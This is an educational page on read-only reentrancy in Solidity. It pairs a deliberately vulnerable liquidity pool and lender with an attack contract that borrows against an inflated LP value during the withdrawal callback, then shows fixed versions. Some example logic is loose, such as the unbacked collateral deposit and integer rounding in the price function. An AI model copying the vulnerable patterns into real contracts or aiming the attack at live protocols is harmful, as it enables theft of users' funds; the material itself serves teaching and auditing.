# 5️⃣ Read-Only Reentrancy

## 📖 Description
A subtle vulnerability where a **view/pure function** is called during a reentrancy attack to read **inconsistent state**. Auditors often overlook this because view functions don't modify state. However, if the state is temporarily inconsistent during execution, the returned values will be wrong.

## 🎯 Key Characteristics
- Targets view/getter functions
- State appears inconsistent mid-execution
- Often missed by auditors (view = safe assumption)
- Dangerous when other protocols depend on these values
- Curve Finance vulnerability (2023)

## 💻 Vulnerable Contracts Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Liquidity Pool with price oracle
contract VulnerablePool {
    uint256 public totalSupply;
    uint256 public reserve0; // ETH
    uint256 public reserve1; // Token
    mapping(address => uint256) public balanceOf;
    
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "Reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function addLiquidity() external payable noReentrant {
        uint256 liquidity = msg.value;
        balanceOf[msg.sender] += liquidity;
        totalSupply += liquidity;
        reserve0 += msg.value;
    }
    
    // VULNERABLE: removeLiquidity updates reserves AFTER callback
    function removeLiquidity(uint256 liquidity) external noReentrant {
        require(balanceOf[msg.sender] >= liquidity, "Insufficient balance");
        
        uint256 ethAmount = (liquidity * reserve0) / totalSupply;
        
        balanceOf[msg.sender] -= liquidity;
        totalSupply -= liquidity;
        
        // External call BEFORE updating reserves
        (bool success, ) = msg.sender.call{value: ethAmount}("");
        require(success, "Transfer failed");
        
        // Reserve update happens too late!
        reserve0 -= ethAmount;
    }
    
    // VIEW FUNCTION - appears safe but returns inconsistent state
    function getPrice() external view returns (uint256) {
        // During removeLiquidity callback, reserves are stale!
        // totalSupply is updated but reserve0 is not
        if (totalSupply == 0) return 0;
        return (reserve0 * 1e18) / totalSupply;
    }
    
    // Another view function with inconsistent state
    function getLPTokenValue() external view returns (uint256) {
        if (totalSupply == 0) return 0;
        return reserve0 / totalSupply;
    }
}

// Lending protocol that trusts the pool's price
contract VulnerableLender {
    VulnerablePool public pool;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150%
    
    constructor(address _pool) {
        pool = VulnerablePool(_pool);
    }
    
    function depositCollateral(uint256 amount) external {
        collateral[msg.sender] += amount;
    }
    
    // VULNERABLE: Uses potentially stale price from pool
    function borrow(uint256 amount) external {
        uint256 lpValue = pool.getLPTokenValue();
        uint256 maxBorrow = (collateral[msg.sender] * lpValue * 100) / COLLATERAL_RATIO;
        
        require(borrowed[msg.sender] + amount <= maxBorrow, "Insufficient collateral");
        
        borrowed[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
    
    receive() external payable {}
}
```

## 🔴 Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePool {
    function addLiquidity() external payable;
    function removeLiquidity(uint256 liquidity) external;
    function getPrice() external view returns (uint256);
    function getLPTokenValue() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IVulnerableLender {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

contract ReadOnlyReentrancyAttack {
    IVulnerablePool public pool;
    IVulnerableLender public lender;
    bool public attacking;
    
    constructor(address _pool, address _lender) {
        pool = IVulnerablePool(_pool);
        lender = IVulnerableLender(_lender);
    }
    
    // Step 1: Add liquidity to pool
    function addLiquidity() external payable {
        pool.addLiquidity{value: msg.value}();
    }
    
    // Step 2: Deposit collateral to lender
    function depositCollateral() external {
        lender.depositCollateral(pool.balanceOf(address(this)));
    }
    
    // Step 3: Start the attack
    function attack() external {
        attacking = true;
        uint256 liquidity = pool.balanceOf(address(this));
        pool.removeLiquidity(liquidity);
    }
    
    // Step 4: Receive callback during removeLiquidity
    receive() external payable {
        if (attacking) {
            attacking = false;
            
            // At this point:
            // - totalSupply has been reduced
            // - reserve0 has NOT been reduced yet
            // - getLPTokenValue() returns INFLATED value!
            
            uint256 inflatedValue = pool.getLPTokenValue();
            
            // Borrow against inflated collateral value
            lender.borrow(5 ether); // Should only be able to borrow ~1 ETH
            
            // Profit!
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## ✅ Fixed Contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecurePool {
    uint256 public totalSupply;
    uint256 public reserve0;
    uint256 public reserve1;
    mapping(address => uint256) public balanceOf;
    
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "Reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    // Add read-only reentrancy guard for view functions
    modifier noReadReentrant() {
        require(!locked, "Read reentrancy");
        _;
    }
    
    function addLiquidity() external payable noReentrant {
        uint256 liquidity = msg.value;
        balanceOf[msg.sender] += liquidity;
        totalSupply += liquidity;
        reserve0 += msg.value;
    }
    
    // FIXED: Update reserves BEFORE external call
    function removeLiquidity(uint256 liquidity) external noReentrant {
        require(balanceOf[msg.sender] >= liquidity, "Insufficient balance");
        
        uint256 ethAmount = (liquidity * reserve0) / totalSupply;
        
        // Update ALL state before external call
        balanceOf[msg.sender] -= liquidity;
        totalSupply -= liquidity;
        reserve0 -= ethAmount; // Update BEFORE external call!
        
        (bool success, ) = msg.sender.call{value: ethAmount}("");
        require(success, "Transfer failed");
    }
    
    // FIXED: Protected against read-only reentrancy
    function getPrice() external view noReadReentrant returns (uint256) {
        if (totalSupply == 0) return 0;
        return (reserve0 * 1e18) / totalSupply;
    }
    
    function getLPTokenValue() external view noReadReentrant returns (uint256) {
        if (totalSupply == 0) return 0;
        return reserve0 / totalSupply;
    }
}

// Secure lender with additional protections
contract SecureLender {
    SecurePool public pool;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150;
    
    constructor(address _pool) {
        pool = SecurePool(_pool);
    }
    
    function depositCollateral(uint256 amount) external {
        collateral[msg.sender] += amount;
    }
    
    function borrow(uint256 amount) external {
        // Additional safety: Use time-weighted average or cached values
        // rather than spot prices that could be manipulated
        uint256 lpValue = pool.getLPTokenValue();
        uint256 maxBorrow = (collateral[msg.sender] * lpValue * 100) / COLLATERAL_RATIO;
        
        require(borrowed[msg.sender] + amount <= maxBorrow, "Insufficient collateral");
        
        borrowed[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
    
    receive() external payable {}
}
```
